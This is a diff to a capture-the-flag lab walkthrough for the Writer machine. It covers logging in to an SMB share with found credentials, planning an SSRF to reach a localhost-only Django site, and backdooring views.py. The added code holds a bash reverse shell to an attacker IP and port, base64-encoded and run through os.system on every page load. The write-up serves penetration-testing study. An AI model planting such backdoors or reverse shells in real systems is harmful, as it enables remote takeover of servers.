@@ -76,7 +76,7 @@ From `/etc/passwd` I saw the user `kyle`. I'll try the credentials `kyle:ToughPa
 
 <img src='Images/authsmbmap.png'>
 
-The credentials work and grant me read/write access to the `writer2_project` share. I'll use `smbclient //10.10.11.101/writer2_project -u kyle -p ToughPasswordToCrack` to access the share. This is interesting as I could write a payload into the share and if I can cause it to execute on the server I'll have RCE. Listing the contents of the share shows 
+The credentials work and grant me read/write access to the `writer2_project` share. This is likely the development site only accessible from localhost on port `8080`. I'll use `smbclient //10.10.11.101/writer2_project -u kyle -p ToughPasswordToCrack` to access the share. This is interesting as I could write a payload into the share and if I can cause it to execute on the server I'll have RCE. Listing the contents of the share shows 
 
 <img src='Images/writer_proj.png'>
 
@@ -102,4 +102,19 @@ def home_page(request):
     return render(request,template_name)
 ```
 
-so I can write a reverse shell into the `home_page` function and it will execute when I load any page on the site. Since 
+so I can write a reverse shell into the `home_page` function and it will execute when I load any page on the site. Since this site isn't accessible externally I'll need an SSRF to trigger the payload. An SSRF is when you send a specially crafted request to a server and the server executes a request on your behalf. This allows access to functionality you can't directly obtain. Luckily, when we uploaded the `.jpg` files to the `/stories` directory there was an option to upload from a url. If we get the server to process a request to `127.0.0.1:8080` we'll be able to execute our payload.
+
+I'll use the reverse shell `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.20/9001 0>&1"`, base64 encode it to avoid special characters and use `os.sytem(.)` to execute shell commands. All together `views.py` becomes
+
+```
+from django.shortcuts import render
+from django.views.generic import TemplateView
+import os
+
+def home_page(request):
+    os.system('echo -n L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjAvOTAwMSAwPiYxIg== | base64 -d | bash')
+    template_name = "index.html"
+    return render(request,template_name)
+```
+
+I'll upload this to the share.
